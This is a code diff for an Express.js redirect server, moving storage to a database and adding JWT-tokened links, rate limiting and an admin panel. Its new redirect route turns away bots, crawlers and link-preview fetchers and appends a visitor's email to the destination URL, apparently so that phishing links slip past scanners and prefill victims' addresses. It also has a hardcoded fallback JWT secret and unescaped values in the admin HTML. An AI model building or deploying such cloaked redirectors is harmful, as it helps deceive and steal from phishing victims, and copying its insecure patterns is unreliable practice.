@@ -1,12 +1,20 @@
-const express = require('express');
-const session = require('express-session');
-const fs = require('fs');
-const path = require('path');
 require('dotenv').config();
+const express = require('express');
+const crypto = require('crypto');
+const jwt = require('jsonwebtoken');
+const rateLimit = require('express-rate-limit');
+const session = require('express-session');
+const db = require('./db'); // MongoDB-based redirect storage
 
 const app = express();
-const PORT = process.env.PORT || 4000;
-const redirectsPath = path.join(__dirname, 'redirects.json');
+const PORT = process.env.PORT || 3000;
+
+const JWT_SECRET = process.env.JWT_SECRET || 'your_strong_secret_key';
+
+// Middleware
+app.use(express.static('public'));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 // Session middleware
 app.use(session({
@@ -15,19 +23,21 @@ app.use(session({
   saveUninitialized: true
 }));
 
-// Parse form data
-app.use(express.urlencoded({ extended: true }));
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 60 * 1000,
+  max: 10,
+  message: 'Too many requests. Please try again later.'
+});
+app.use(limiter);
 
 // Auth middleware
 function authMiddleware(req, res, next) {
-  if (req.session && req.session.isAdmin) {
-    return next();
-  } else {
-    return res.redirect('/login');
-  }
+  if (req.session && req.session.isAdmin) return next();
+  return res.redirect('/login');
 }
 
-// Admin login routes
+// Admin login
 app.get('/login', (req, res) => {
   res.send(`
     <h1>Login</h1>
@@ -41,10 +51,7 @@ app.get('/login', (req, res) => {
 
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
-  if (
-    username === process.env.ADMIN_USER &&
-    password === process.env.ADMIN_PASS
-  ) {
+  if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
     req.session.isAdmin = true;
     res.redirect('/admin');
   } else {
@@ -53,26 +60,23 @@ app.post('/login', (req, res) => {
 });
 
 app.get('/logout', (req, res) => {
-  req.session.destroy(() => {
-    res.redirect('/');
-  });
+  req.session.destroy(() => res.redirect('/login'));
 });
 
 // Admin panel
-app.get('/admin', authMiddleware, (req, res) => {
-  const redirects = JSON.parse(fs.readFileSync(redirectsPath, 'utf-8'));
-
-  const listItems = Object.entries(redirects).map(([from, to]) => `
+app.get('/admin', authMiddleware, async (req, res) => {
+  const redirects = await db.getAllRedirects();
+  const listItems = redirects.map(r => `
     <li>
-      <strong>${from}</strong> → ${to}
+      <strong>${r.key}</strong> → ${r.destination}
       <form method="POST" action="/admin/delete" style="display:inline;">
-        <input type="hidden" name="path" value="${from}" />
+        <input type="hidden" name="key" value="${r.key}" />
         <button>Delete</button>
       </form>
       <form method="POST" action="/admin/edit" style="display:inline;">
-        <input type="hidden" name="original" value="${from}" />
-        <input name="from" value="${from}" style="width:100px" />
-        <input name="to" value="${to}" style="width:200px" />
+        <input type="hidden" name="original" value="${r.key}" />
+        <input name="from" value="${r.key}" style="width:100px" />
+        <input name="to" value="${r.destination}" style="width:200px" />
         <button>Update</button>
       </form>
     </li>
@@ -93,45 +97,65 @@ app.get('/admin', authMiddleware, (req, res) => {
   `);
 });
 
-app.post('/admin/add', authMiddleware, (req, res) => {
-  const redirects = JSON.parse(fs.readFileSync(redirectsPath, 'utf-8'));
-  redirects[req.body.from] = req.body.to;
-  fs.writeFileSync(redirectsPath, JSON.stringify(redirects, null, 2));
-  res.redirect('/admin');
+app.post('/admin/add', authMiddleware, async (req, res) => {
+  const { from, to } = req.body;
+  const token = jwt.sign({ key: from }, JWT_SECRET);
+  db.addRedirect(from, to, token, (err) => {
+    if (err) console.error('Add error:', err);
+    res.redirect('/admin');
+  });
 });
 
 app.post('/admin/delete', authMiddleware, (req, res) => {
-  const redirects = JSON.parse(fs.readFileSync(redirectsPath, 'utf-8'));
-  delete redirects[req.body.path];
-  fs.writeFileSync(redirectsPath, JSON.stringify(redirects, null, 2));
-  res.redirect('/admin');
+  db.deleteRedirect(req.body.key, (err) => {
+    if (err) console.error('Delete error:', err);
+    res.redirect('/admin');
+  });
 });
 
 app.post('/admin/edit', authMiddleware, (req, res) => {
   const { original, from, to } = req.body;
-  const redirects = JSON.parse(fs.readFileSync(redirectsPath, 'utf-8'));
-
-  if (original !== from) {
-    delete redirects[original];
-  }
-
-  redirects[from] = to;
-  fs.writeFileSync(redirectsPath, JSON.stringify(redirects, null, 2));
-  res.redirect('/admin');
+  db.updateRedirect(original, from, to, (err) => {
+    if (err) console.error('Update error:', err);
+    res.redirect('/admin');
+  });
 });
 
-// Redirect handler
-app.get('*', (req, res) => {
-  const redirects = JSON.parse(fs.readFileSync(redirectsPath, 'utf-8'));
-  const target = redirects[req.path];
-  if (target) {
-    res.redirect(target);
-  } else {
-    res.status(404).send('Redirect not found.');
+// Secure redirect endpoint
+app.get('/:key/:token', (req, res) => {
+  const { key, token } = req.params;
+  const email = req.query.email || null;
+  const userAgent = req.headers['user-agent'] || '';
+
+  if (/bot|crawl|spider|preview/i.test(userAgent)) {
+    return res.status(403).send('Access denied.');
+  }
+
+  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    return res.status(400).send('Invalid email format.');
+  }
+
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    db.getRedirect(key, (err, row) => {
+      if (err) return res.status(500).send('Server error.');
+      if (!row || row.token !== token) return res.status(403).send('Invalid token.');
+
+      let destination = row.destination;
+      if (email) {
+        destination += destination.endsWith('/') ? email : `/${email}`;
+      }
+      res.redirect(destination);
+    });
+  } catch (err) {
+    res.status(403).send('Invalid or expired token.');
   }
 });
 
-// Start server
+app.use((req, res) => {
+  res.status(404).send('Error: Invalid request.');
+});
+
 app.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
 });
